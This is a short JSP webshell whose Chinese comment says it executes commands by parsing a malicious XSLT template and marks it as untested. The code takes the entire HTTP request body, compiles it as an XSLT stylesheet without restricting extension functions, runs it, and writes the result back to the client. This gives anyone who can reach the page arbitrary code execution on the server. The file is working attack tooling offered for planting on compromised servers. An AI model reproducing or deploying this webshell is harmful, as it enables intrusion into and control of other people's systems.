<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.ByteArrayInputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="javax.xml.transform.stream.StreamResult" %>
<%@ page import="javax.xml.transform.TransformerFactory" %>
<%@ page import="javax.xml.transform.stream.StreamSource" %>
<%@ page import="javax.xml.transform.Transformer" %>
<%--
XSLT, 是XML文档的样式表语言。
可通过构建恶意的模板让Webshell来解析,从而达到命令执行的目的
【未测试】
--%>
<%
    BufferedReader br = request.getReader();
    String line, wholeStr = "";
    while ((line = br.readLine()) != null) {
        wholeStr += line + "\n";
    }
    br.close();

    if (wholeStr != null && !wholeStr.trim().equals("")) {
        wholeStr = wholeStr.substring(0, wholeStr.length() - 1);
        try {
            InputStream in = new ByteArrayInputStream(wholeStr.getBytes());
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            StreamResult sret = new StreamResult(baos);

            Transformer t = TransformerFactory.newInstance().newTransformer(new StreamSource(in));
            t.transform(new StreamSource(new ByteArrayInputStream("<?xml version=\"1.0\"?><data></data>".getBytes())), sret);
            response.getWriter().print(baos.toString().trim().substring(1).trim());
            out.clearBuffer();
            baos.close();
            in.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
%>
